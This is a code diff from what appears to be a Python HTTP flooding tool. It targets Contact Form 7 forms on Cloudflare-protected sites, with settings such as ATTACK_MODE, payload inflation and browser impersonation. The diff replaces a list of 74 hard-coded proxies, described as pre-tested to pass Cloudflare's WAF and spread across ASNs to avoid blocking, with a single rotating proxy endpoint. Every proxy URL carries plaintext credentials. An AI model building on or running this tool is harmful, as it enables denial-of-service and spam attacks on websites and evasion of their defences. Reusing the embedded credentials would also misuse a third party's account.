@@ -150,90 +150,9 @@ LARGE_PAYLOAD    = False
 INFLATE_HEADERS  = False
 ATTACK_MODE      = "cf7"
 
-# ── Cron-mode embedded proxy pool (ASN-interleaved, CF-validated) ──────────────
-# 74 static Webshare datacenter proxies, pre-tested to pass CF WAF (GET 200).
-# Arranged so no two consecutive proxies share the same ASN.
-_CRON_PROXIES = [
-    "http://nxatttwl:ut2g8d8peqva@31.57.86.144:5526",    # AS397423 Tier.Net
-    "http://nxatttwl:ut2g8d8peqva@172.120.102.113:6273",  # AS18779 EGIHosting
-    "http://nxatttwl:ut2g8d8peqva@145.223.54.209:6174",   # AS397423 Tier.Net
-    "http://nxatttwl:ut2g8d8peqva@172.120.119.87:5747",   # AS18779 EGIHosting
-    "http://nxatttwl:ut2g8d8peqva@31.59.13.173:6443",     # AS397423 Tier.Net
-    "http://nxatttwl:ut2g8d8peqva@172.120.112.244:5923",  # AS18779 EGIHosting
-    "http://nxatttwl:ut2g8d8peqva@31.58.26.102:6685",     # AS397423 Tier.Net
-    "http://nxatttwl:ut2g8d8peqva@198.89.123.147:6689",   # AS13332 Hype
-    "http://nxatttwl:ut2g8d8peqva@31.59.13.149:6419",     # AS397423 Tier.Net
-    "http://nxatttwl:ut2g8d8peqva@104.164.254.14:6693",   # AS18779 EGIHosting
-    "http://nxatttwl:ut2g8d8peqva@145.223.54.171:6136",   # AS397423 Tier.Net
-    "http://nxatttwl:ut2g8d8peqva@206.206.122.140:5771",  # AS13332 Hype
-    "http://nxatttwl:ut2g8d8peqva@154.6.8.94:5561",       # AS64286 LogicWeb
-    "http://nxatttwl:ut2g8d8peqva@50.114.82.142:7126",    # AS11798 Ace DC
-    "http://nxatttwl:ut2g8d8peqva@154.3.232.203:5225",    # AS174 Cogent
-    "http://nxatttwl:ut2g8d8peqva@82.108.64.18:6657",     # AS30058 FDCservers
-    "http://nxatttwl:ut2g8d8peqva@31.58.10.92:6060",      # AS397423 Tier.Net
-    "http://nxatttwl:ut2g8d8peqva@136.0.109.123:6409",    # AS18779 EGIHosting
-    "http://nxatttwl:ut2g8d8peqva@103.251.223.19:5998",   # AS13332 Hype
-    "http://nxatttwl:ut2g8d8peqva@154.6.59.22:6490",      # AS64286 LogicWeb
-    "http://nxatttwl:ut2g8d8peqva@50.114.117.52:7035",    # AS11798 Ace DC
-    "http://nxatttwl:ut2g8d8peqva@38.154.205.91:5359",    # AS174 Cogent
-    "http://nxatttwl:ut2g8d8peqva@82.108.67.105:5244",    # AS30058 FDCservers
-    "http://nxatttwl:ut2g8d8peqva@142.111.48.218:6995",   # AS395954 Leaseweb
-    "http://nxatttwl:ut2g8d8peqva@31.58.10.20:5988",      # AS397423 Tier.Net
-    "http://nxatttwl:ut2g8d8peqva@136.0.108.123:5799",    # AS18779 EGIHosting
-    "http://nxatttwl:ut2g8d8peqva@173.211.69.35:6628",    # AS13332 Hype
-    "http://nxatttwl:ut2g8d8peqva@154.6.23.222:6689",     # AS64286 LogicWeb
-    "http://nxatttwl:ut2g8d8peqva@23.26.94.25:6007",      # AS11798 Ace DC
-    "http://nxatttwl:ut2g8d8peqva@154.21.154.131:6318",   # AS174 Cogent
-    "http://nxatttwl:ut2g8d8peqva@82.108.67.133:5272",    # AS30058 FDCservers
-    "http://nxatttwl:ut2g8d8peqva@136.0.182.243:6313",    # AS395954 Leaseweb
-    "http://nxatttwl:ut2g8d8peqva@184.174.28.55:5070",    # AS21769 ColAmerica
-    "http://nxatttwl:ut2g8d8peqva@45.41.172.227:5970",    # AS46516 HostRoyale
-    "http://nxatttwl:ut2g8d8peqva@31.58.19.140:6412",     # AS397423 Tier.Net
-    "http://nxatttwl:ut2g8d8peqva@142.111.192.184:5780",  # AS18779 EGIHosting
-    "http://nxatttwl:ut2g8d8peqva@67.227.14.101:6693",    # AS13332 Hype
-    "http://nxatttwl:ut2g8d8peqva@154.6.59.104:6572",     # AS64286 LogicWeb
-    "http://nxatttwl:ut2g8d8peqva@23.26.68.91:6074",      # AS11798 Ace DC
-    "http://nxatttwl:ut2g8d8peqva@38.154.200.218:5919",   # AS174 Cogent
-    "http://nxatttwl:ut2g8d8peqva@82.108.64.187:6826",    # AS30058 FDCservers
-    "http://nxatttwl:ut2g8d8peqva@208.70.8.140:7240",     # AS395954 Leaseweb
-    "http://nxatttwl:ut2g8d8peqva@184.174.28.50:5065",    # AS21769 ColAmerica
-    "http://nxatttwl:ut2g8d8peqva@45.61.96.240:6220",     # AS46516 HostRoyale
-    "http://nxatttwl:ut2g8d8peqva@104.253.208.197:6608",  # AS202015 HZ Hosting
-    "http://nxatttwl:ut2g8d8peqva@136.0.127.40:5749",     # AS40676 Psychz
-    "http://nxatttwl:ut2g8d8peqva@191.96.254.243:6290",   # AS396190 Leaseweb
-    "http://nxatttwl:ut2g8d8peqva@104.239.80.209:5787",   # AS62874 Web2Objects
-    "http://nxatttwl:ut2g8d8peqva@166.88.34.226:5937",    # AS27411 Leaseweb
-    "http://nxatttwl:ut2g8d8peqva@142.147.129.188:5797",  # AS2914 NTT
-    "http://nxatttwl:ut2g8d8peqva@136.0.103.201:5902",    # AS396362 Leaseweb
-    "http://nxatttwl:ut2g8d8peqva@104.245.244.243:6683",  # AS397423 Tier.Net
-    "http://nxatttwl:ut2g8d8peqva@172.120.106.12:6167",   # AS18779 EGIHosting
-    "http://nxatttwl:ut2g8d8peqva@67.227.14.184:6776",    # AS13332 Hype
-    "http://nxatttwl:ut2g8d8peqva@64.64.118.137:6720",    # AS64286 LogicWeb
-    "http://nxatttwl:ut2g8d8peqva@50.114.93.136:6120",    # AS11798 Ace DC
-    "http://nxatttwl:ut2g8d8peqva@154.9.177.156:5436",    # AS174 Cogent
-    "http://nxatttwl:ut2g8d8peqva@213.169.212.17:6657",   # AS30058 FDCservers
-    "http://nxatttwl:ut2g8d8peqva@136.0.126.138:5899",    # AS395954 Leaseweb
-    "http://nxatttwl:ut2g8d8peqva@173.214.177.71:5762",   # AS21769 ColAmerica
-    "http://nxatttwl:ut2g8d8peqva@45.61.100.62:6330",     # AS46516 HostRoyale
-    "http://nxatttwl:ut2g8d8peqva@45.39.4.58:5483",       # AS202015 HZ Hosting
-    "http://nxatttwl:ut2g8d8peqva@23.27.236.83:6819",     # AS40676 Psychz
-    "http://nxatttwl:ut2g8d8peqva@191.101.25.174:6571",   # AS396190 Leaseweb
-    "http://nxatttwl:ut2g8d8peqva@45.61.127.216:6155",    # AS62874 Web2Objects
-    "http://nxatttwl:ut2g8d8peqva@136.0.118.242:6614",    # AS27411 Leaseweb
-    "http://nxatttwl:ut2g8d8peqva@142.147.240.148:6670",  # AS2914 NTT
-    "http://nxatttwl:ut2g8d8peqva@136.0.103.200:5901",    # AS396362 Leaseweb
-    "http://nxatttwl:ut2g8d8peqva@199.180.9.127:6147",    # AS394380 Leaseweb
-    "http://nxatttwl:ut2g8d8peqva@45.150.23.197:6667",    # AS397373 H4Y Tech
-    "http://nxatttwl:ut2g8d8peqva@92.113.3.39:6048",      # AS30633 Leaseweb
-    "http://nxatttwl:ut2g8d8peqva@191.101.174.211:6259",  # AS19148 Leaseweb
-    "http://nxatttwl:ut2g8d8peqva@154.29.232.92:6752",    # AS46261 QuickPacket
-    "http://nxatttwl:ut2g8d8peqva@179.61.166.29:6452",    # AS7203 Leaseweb
-]
-
-_cron_proxy_idx   = 0
-_cron_proxy_fails = 0
-_cron_proxy_lock  = threading.Lock()
-_CRON_FAIL_THRESHOLD = 3
+# ── Cron-mode rotating proxy (Webshare rotating endpoint) ─────────────────────
+# Each request gets a fresh IP from Webshare's pool automatically.
+_CRON_ROTATING_PROXY = "http://nxattwl-rotate:ut2g8d8peqva@p.webshare.io:80"
 
 _ACCEPT_LANGS = [
     "en-US,en;q=0.9,fr-FR;q=0.8,fr;q=0.7,de-DE;q=0.6,de;q=0.5,es-ES;q=0.4,es;q=0.3,"
@@ -603,14 +522,8 @@ def build_multipart(form_id, unit_tag, large_payload=False):
 # ─────────────────────────────────────────────────────────────────────────────
 
 def send_one(req_num, cfg, pool):
-    global _cron_proxy_idx, _cron_proxy_fails
-
-    # Cron mode: use embedded ASN-interleaved proxy list.
-    # Proxy advances only when consecutive failures reach _CRON_FAIL_THRESHOLD.
     if ATTACK_MODE == "cron":
-        with _cron_proxy_lock:
-            my_proxy_idx = _cron_proxy_idx
-            proxy = _CRON_PROXIES[my_proxy_idx % len(_CRON_PROXIES)]
+        proxy = _CRON_ROTATING_PROXY
     else:
         proxy = None
         if pool is not None:
@@ -620,8 +533,7 @@ def send_one(req_num, cfg, pool):
 
     domain = cfg["url"].split("/")[2]
     if ATTACK_MODE == "cron":
-        ip_label = proxy.split("@")[1] if "@" in proxy else proxy
-        label = f"cron-proxy[{_cron_proxy_idx % len(_CRON_PROXIES)}] {ip_label}"
+        label = "rotating:p.webshare.io"
     else:
         label = proxy if proxy else "direct (own IP)"
     if FIXED_PROFILE is not None:
@@ -684,27 +596,10 @@ def send_one(req_num, cfg, pool):
             cache = f"{cache}/ls:{ls_cache}"
         mit     = r.headers.get("cf-mitigated", "")
         code    = r.status_code if not mit else 999
-        if ATTACK_MODE == "cron":
-            with _cron_proxy_lock:
-                if _cron_proxy_idx == my_proxy_idx:
-                    if mit:
-                        _cron_proxy_fails += 1
-                        if _cron_proxy_fails >= _CRON_FAIL_THRESHOLD:
-                            _cron_proxy_idx  += 1
-                            _cron_proxy_fails = 0
-                    else:
-                        _cron_proxy_fails = 0
         return req_num, code, elapsed, cache, label, (f"cf-mitigated={mit}" if mit else None), impersonate
     except Exception as e:
         elapsed = time.time() - t0
-        if ATTACK_MODE == "cron":
-            with _cron_proxy_lock:
-                if _cron_proxy_idx == my_proxy_idx:
-                    _cron_proxy_fails += 1
-                    if _cron_proxy_fails >= _CRON_FAIL_THRESHOLD:
-                        _cron_proxy_idx  += 1
-                        _cron_proxy_fails = 0
-        elif pool is not None:
+        if pool is not None and ATTACK_MODE != "cron":
             pool.mark_dead(proxy)
         return req_num, 0, elapsed, "N/A", label, str(e)[:40], impersonate
 
